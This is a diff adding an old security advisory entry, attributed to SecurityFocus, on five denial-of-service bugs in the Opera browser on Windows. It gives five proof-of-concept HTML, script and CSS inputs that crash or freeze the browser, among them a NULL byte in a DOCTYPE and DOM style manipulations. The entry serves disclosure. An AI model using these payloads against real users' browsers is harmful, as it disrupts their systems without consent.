@@ -1,0 +1,72 @@
+source: http://www.securityfocus.com/bid/8066/info
+
+Opera has been reported to be prone to five denial of service vulnerabilities. These issues can be triggered when the browser attempts to interpret a document with malformed code. Exploitation could cause the browser to terminate or freeze.
+
+This issue was reported for Opera on Microsoft Windows platforms. It is not known if other releases are affected.
+
+[ CODE 1 ]
+
+Just 12 bytes data "<!DOCTYPE" + NULL(\x00) + 1byte + ">" makes
+CPU usage go up to 100%(depending on comp specs) and the computer
+gets freeze down.
+
+-----------------------------------------------------------------
+<!DOCTYPE[\x00]A>
+-----------------------------------------------------------------
+
+[ CODE 2 ]
+
+Abnormal termination is caused.
+
+-----------------------------------------------------------------
+<form></form><script>document.forms[0].submit()</script>
+-----------------------------------------------------------------
+
+[ CODE 3 ]
+
+Abnormal termination is caused.
+
+-----------------------------------------------------------------
+<table>
+<tr id="crash" style="display:inline"><td>
+<script>crash.style.display = "none";</script>
+</td></tr>
+</table>
+-----------------------------------------------------------------
+
+[ CODE 4 ]
+
+Abnormal termination is caused.
+
+-----------------------------------------------------------------
+<table>
+<map id="crash" style="position:absolute"></map>
+<script>crash.style.height = crash.style.width = '0';</script>
+</table>
+-----------------------------------------------------------------
+
+[ CODE 5 ]
+
+CPU usage go up to 100%(depending on comp specs) and the computer gets freeze down.
+
+-----------------------------------------------------------------
+<html>
+<head>
+<style type="text/css">
+<!--
+.aaaaa:after{content:"A";display:block}
+.bbbbb{display:run-in}
+.ccccc{display:inline-block}
+//-->
+</style>
+</head>
+<body>
+<div class="aaaaa">
+<div class="bbbbb">
+<div class="ccccc">
+</div>
+</div>
+</div>
+</body>
+</html>
+-----------------------------------------------------------------
